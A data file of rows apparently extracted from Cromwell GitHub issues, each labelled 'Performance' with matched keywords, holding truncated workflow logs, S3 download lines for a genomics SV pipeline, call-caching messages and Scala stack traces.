focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz.tbi; 1608597651575,*** COMPLETED LOCALIZATION ***; 1608597657265,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-6/cacheCopy/SR00c.HG00239.txt.gz.tbi; 1608597658212,[W::hts_idx_load2] The index file is older than the data file: /tmp/scratch/fo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:197337,cache,cacheCopy,197337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz; 1608597283995,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz; 1608597286657,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz; 1608597289714,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:94816,cache,cacheCopy,94816,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz.tbi; 1608596990438,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz; 1608596992645,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-24/cacheCopy/SR00c.HG01325.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-24/cacheCopy/SR00c.HG01325.txt.gz; 1608596994248,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:15034,cache,cacheCopy,15034,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz; 1608597376806,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-131/cacheCopy/SR00c.NA19443.txt.gz; 1608597378569,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-40/cacheCopy/SR00c.HG01874.txt.gz.tbi; 1608597381292,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:119119,cache,cacheCopy,119119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz; 1608597227140,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-154/cacheCopy/SR00c.NA21102.txt.gz; 1608597229301,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-62/cacheCopy/SR00c.HG02491.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-62/cacheCopy/SR00c.HG02491.txt.gz; 1608597232457,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:79237,cache,cacheCopy,79237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-91/cacheCopy/SR00c.HG03727.txt.gz; 1608597098791,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-122/cacheCopy/SR00c.NA19001.txt.gz; 1608597101844,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz; 1608597103907,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:44339,cache,cacheCopy,44339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz; 1608597502968,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz; 1608597504024,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-62/cacheCopy/SR00c.HG02491.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-62/cacheCopy/SR00c.HG02491.txt.gz.tbi; 1608597507274,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:156545,cache,cacheCopy,156545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1 cache hit copying success with aggregated hashes: initial = 179EA0EE9B87629C24E64D33DEB38610, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,37] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.date_of_death:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:00,67] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.white_brits:-1:1-20000000000 [9e4f5894main.white_brits:NA:1]: Unrecognized runtime attribute keys: dx_timeout; [2022-12-15 21:23:00,68] [info] BT-322 9e4f5894:main.white_brits:-1:1 cache hit copying success with aggregated hashes: initial = EB2F16A657136E0208581A7B6A7F020F, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:23:00,68] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.white_brits:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.year_of_birth' (scatter index: None, attempt 1); [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.phenotype' (scatter index: None, attempt 1); [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.date_of_death' (scatter index: None, attempt 1); [2022-12-15 21:23:02,52] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.white_brits' (scatter index: None, attempt 1); [2022-12-15 21:23:03,67] [info] Assigned new job execution tokens to the following groups: 9e4f5894: 3; [2022-12-15 21:23:03,69] [info] BT-322 9e4f5894:main.categorical_covariates:0:1 is eligible for call caching with read = true and write = tru",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:27124,cache,cache,27124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"1 of 1): [Attempted 1 time(s)] - IOException: Could not read from /home/devarea/karl/PathoCromwell/cromwell-executions/Agilent_Exome_Single/3f4aa8de-d1a9-419a-b9b4-10f9ed0a9d53/call-SomaticVariants/SomaticVariantcalling/0c6cefa3-4c84-497f-8003-b0d7221bedbc/call-mutect2/Mutect2/fb66e417-4c06-4f15-8607-da8261e16448/call-scatterList/execution/stdout: /home/devarea/karl/PathoCromwell/cromwell-executions/Agilent_Exome_Single/3f4aa8de-d1a9-419a-b9b4-10f9ed0a9d53/call-SomaticVariants/SomaticVariantcalling/0c6cefa3-4c84-497f-8003-b0d7221bedbc/call-mutect2/Mutect2/fb66e417-4c06-4f15-8607-da8261e16448/call-scatterList/execution/stdout; cromwell_1 | at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:973); cromwell_1 | at scala.util.Success.$anonfun$map$1(Try.scala:255) cromwell_1 | at scala.util.Success.map(Try.scala:213); cromwell_1 | at scala.concurrent.Future.$anonfun$map$1(Future.scala:292) ; cromwell_1 | at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33) cromwell_1 | at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33) cromwell_1 | at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64) cromwell_1 | at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) cromwell_1 | at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92) ; `. Basically cromwell fails to read a stdout file written by a job.; When we check the file it exists and contains data so i suspect some kind of IO problem. All Data is on NFS shares which are usually quite stable and we see no errors in any of the filesystem/nfs backends. It seems to mostly happen in this scatter step, so i suspect some race condition or timeout somewhere in there, however, this job was creating a scatter to 12 bed files, so its really not that big . Just re-running the job usually works, but its extremely annoying. Call caching is disabled:; `call-caching",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094:1909,concurren,concurrent,1909,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094,1,['concurren'],['concurrent']
Performance,1); cromwell_1 | 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); cromwell_1 | 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); cromwell_1 | 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); cromwell_1 | 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); cromwell_1 | 	at scala.collection.TraversableLike$class.flatMap(TraversableLike.scala:241); cromwell_1 | 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:104); cromwell_1 | 	at wdl4s.WdlNamespace$$anonfun$42.apply(WdlNamespace.scala:402); cromwell_1 | 	at wdl4s.WdlNamespace$$anonfun$42.apply(WdlNamespace.scala:401); cromwell_1 | 	at scala.collection.TraversableLike$$anonfun$flatMap$1.apply(TraversableLike.scala:241); cromwell_1 | 	at scala.collection.TraversableLike$$anonfun$flatMap$1.apply(TraversableLike.scala:241); cromwell_1 | 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); cromwell_1 | 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); cromwell_1 | 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); cromwell_1 | 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); cromwell_1 | 	at scala.collection.TraversableLike$class.flatMap(TraversableLike.scala:241); cromwell_1 | 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:104); cromwell_1 | 	at wdl4s.WdlNamespace$.apply(WdlNamespace.scala:401); cromwell_1 | 	at wdl4s.WdlNamespace$$anonfun$wdl4s$WdlNamespace$$load$1.apply(WdlNamespace.scala:177); cromwell_1 | 	at wdl4s.WdlNamespace$$anonfun$wdl4s$WdlNamespace$$load$1.apply(WdlNamespace.scala:177); cromwell_1 | 	at scala.util.Try$.apply(Try.scala:192); cromwell_1 | 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$load(WdlNamespace.scala:176); cromwell_1 | 	at wdl4s.WdlNamespace$.loadUsingSource(WdlNamespace.scala:173); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:48); cromwell_1 | 	... 26 more. ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2284:8568,load,load,8568,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2284,4,['load'],"['load', 'loadUsingSource']"
Performance,1. Added cacheEnabled and cacheForceRw support in workflow options.; 2. Added missing keys during initialization to log a warning message if a key is not in that list. Reviewers: @jainh and @geoffjentry.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1184:9,cache,cacheEnabled,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1184,2,['cache'],"['cacheEnabled', 'cacheForceRw']"
Performance,"1. Find a scientific workflow and run it manually a couple of times to confirm that it is successfully caching as expected (write to cache set to true for all these runs).; 2. Try to invalidate some cache hits (by deleting certain outputs).; 3. Re-run the workflow and confirm that it's not using the invalidated cache hits and using alternate cache hits instead.; 4. Re-run with using floating tags vs hashing and confirm expected behavior.; ; AC: Try the alterations above and others that seem relevant. Keep logs of the workflow attempts or metadata, something to journal this testing.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1986:133,cache,cache,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1986,4,['cache'],['cache']
Performance,"1. I think call caching should work with the in-memory database, but I would think its utility is very limited – when you restart Cromwell and erase the DB, all of your call caching information is lost.; 2. Call caching operates at the task level and is independent of workflows. If a task has the same command, input files, docker images, and maybe some other stuff I don't remember, cache reading will take place.; 3. Maybe we do explicitly disable CC with HSQL for the reasons described in (1). In any case I strongly recommend setting up a persistent RDBMS if you intend to use Cromwell with call caching. Hope this helps,; Adam",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5280#issuecomment-561684948:385,cache,cache,385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5280#issuecomment-561684948,1,['cache'],['cache']
Performance,1.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:69) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.Option.map(Option.scala:146) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Success.map(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDi,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472:2656,concurren,concurrent,2656,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472,1,['concurren'],['concurrent']
